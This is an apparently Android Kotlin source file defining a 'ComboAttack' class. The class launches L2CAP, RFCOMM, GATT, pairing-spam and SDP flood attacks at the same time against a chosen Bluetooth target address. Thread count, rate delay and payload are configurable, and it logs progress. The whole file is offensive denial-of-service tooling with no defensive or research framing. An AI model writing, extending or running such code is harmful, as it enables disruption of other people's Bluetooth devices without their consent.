package api

import android.content.Context

/**
 * Layered ("combo") attack: runs L2CAP flood, RFCOMM channel flood, GATT flood,
 * pairing spam and SDP query storm simultaneously against the same target,
 * coordinated under a single Start/Stop control.
 */
class ComboAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0,
    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
    private val payloadSize: Int = 0,
    private val bombard: Boolean = false
) : BluetoothAttack {

    override val displayName = AttackType.COMBO.displayName
    override val description = AttackType.COMBO.description

    private val attacks = mutableListOf<BluetoothAttack>()
    @Volatile
    private var running = false

    override fun isRunning() = running

    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        attacks.clear()
        attacks.add(L2capFloodAttack(targetAddress, threads, rateDelayMs, payloadPattern, payloadSize, bombard))
        attacks.add(RfcommChannelFloodAttack(targetAddress, threads, rateDelayMs, payloadPattern, payloadSize))
        attacks.add(GattFloodAttack(targetAddress, threads, rateDelayMs))
        attacks.add(PairingFloodAttack(targetAddress, threads.coerceIn(1, 3), rateDelayMs))
        attacks.add(SdpFloodAttack(targetAddress, threads, rateDelayMs))
        onLog("[COMBO] Iniciado: L2CAP + RFCOMM + GATT + Pairing + SDP sobre $targetAddress")
        attacks.forEach { attack ->
            attack.start(context) { message -> onLog("[COMBO][${attack.displayName}] $message") }
        }
    }

    override fun stop() {
        running = false
        attacks.forEach { it.stop() }
        attacks.clear()
    }
}
